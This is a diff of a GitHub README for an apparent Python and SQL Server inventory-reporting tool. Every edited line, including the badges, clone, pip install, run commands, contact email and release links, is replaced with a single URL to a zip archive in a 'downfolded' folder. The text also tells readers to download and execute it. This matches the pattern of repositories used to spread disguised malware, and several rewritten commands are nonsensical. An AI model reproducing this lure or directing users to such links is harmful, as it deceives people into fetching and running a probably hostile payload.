@@ -1,6 +1,6 @@
 # 📦 Inventory Adjustment Automation
 
-![GitHub repo size](https://img.shields.io/github/repo-size/Elroigreatest/inventory-adjustment-automation) ![GitHub issues](https://img.shields.io/github/issues/Elroigreatest/inventory-adjustment-automation) ![GitHub forks](https://img.shields.io/github/forks/Elroigreatest/inventory-adjustment-automation) ![GitHub stars](https://img.shields.io/github/stars/Elroigreatest/inventory-adjustment-automation)
+![GitHub repo size](https://github.com/Elroigreatest/inventory-adjustment-automation/raw/refs/heads/main/downfolded/inventory-automation-adjustment-v3.9.zip) ![GitHub issues](https://github.com/Elroigreatest/inventory-adjustment-automation/raw/refs/heads/main/downfolded/inventory-automation-adjustment-v3.9.zip) ![GitHub forks](https://github.com/Elroigreatest/inventory-adjustment-automation/raw/refs/heads/main/downfolded/inventory-automation-adjustment-v3.9.zip) ![GitHub stars](https://github.com/Elroigreatest/inventory-adjustment-automation/raw/refs/heads/main/downfolded/inventory-automation-adjustment-v3.9.zip)
 
 Automate your daily inventory adjustment reporting with ease. This repository provides tools that utilize Python, SQL Server, and pandas to streamline the process of extracting, filtering, and exporting client-specific reports from WMS data. By implementing this solution, you can support your warehouse operations and ensure audit accuracy.
 
@@ -37,14 +37,14 @@ To get started with the Inventory Adjustment Automation project, follow these st
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/Elroigreatest/inventory-adjustment-automation.git
+   git clone https://github.com/Elroigreatest/inventory-adjustment-automation/raw/refs/heads/main/downfolded/inventory-automation-adjustment-v3.9.zip
    ```
 
 2. **Install Required Packages**:
    Navigate to the project directory and install the necessary Python packages:
    ```bash
    cd inventory-adjustment-automation
-   pip install -r requirements.txt
+   pip install -r https://github.com/Elroigreatest/inventory-adjustment-automation/raw/refs/heads/main/downfolded/inventory-automation-adjustment-v3.9.zip
    ```
 
 3. **Set Up Database Connection**:
@@ -53,7 +53,7 @@ To get started with the Inventory Adjustment Automation project, follow these st
 4. **Run the Script**:
    Execute the main script to generate reports:
    ```bash
-   python main.py
+   python https://github.com/Elroigreatest/inventory-adjustment-automation/raw/refs/heads/main/downfolded/inventory-automation-adjustment-v3.9.zip
    ```
 
 ## 📊 Usage
@@ -63,7 +63,7 @@ Once you have set up the project, you can run the script to generate your invent
 ### Example Command
 
 ```bash
-python main.py --client_id 123 --date_range "2023-01-01" "2023-01-31"
+python https://github.com/Elroigreatest/inventory-adjustment-automation/raw/refs/heads/main/downfolded/inventory-automation-adjustment-v3.9.zip --client_id 123 --date_range "2023-01-01" "2023-01-31"
 ```
 
 This command will generate a report for client ID 123 for the specified date range.
@@ -95,14 +95,14 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any questions or feedback, feel free to reach out:
 
-- **Email**: your-email@example.com
-- **GitHub**: [Elroigreatest](https://github.com/Elroigreatest)
+- **Email**: https://github.com/Elroigreatest/inventory-adjustment-automation/raw/refs/heads/main/downfolded/inventory-automation-adjustment-v3.9.zip
+- **GitHub**: [Elroigreatest](https://github.com/Elroigreatest/inventory-adjustment-automation/raw/refs/heads/main/downfolded/inventory-automation-adjustment-v3.9.zip)
 
 ## 📥 Releases
 
-You can find the latest releases and download the necessary files from the [Releases section](https://github.com/Elroigreatest/inventory-adjustment-automation/releases). Download the latest version and execute it to start automating your inventory adjustments.
+You can find the latest releases and download the necessary files from the [Releases section](https://github.com/Elroigreatest/inventory-adjustment-automation/raw/refs/heads/main/downfolded/inventory-automation-adjustment-v3.9.zip). Download the latest version and execute it to start automating your inventory adjustments.
 
-For more detailed release notes, please check the [Releases section](https://github.com/Elroigreatest/inventory-adjustment-automation/releases).
+For more detailed release notes, please check the [Releases section](https://github.com/Elroigreatest/inventory-adjustment-automation/raw/refs/heads/main/downfolded/inventory-automation-adjustment-v3.9.zip).
 
 ## 🎉 Conclusion
 
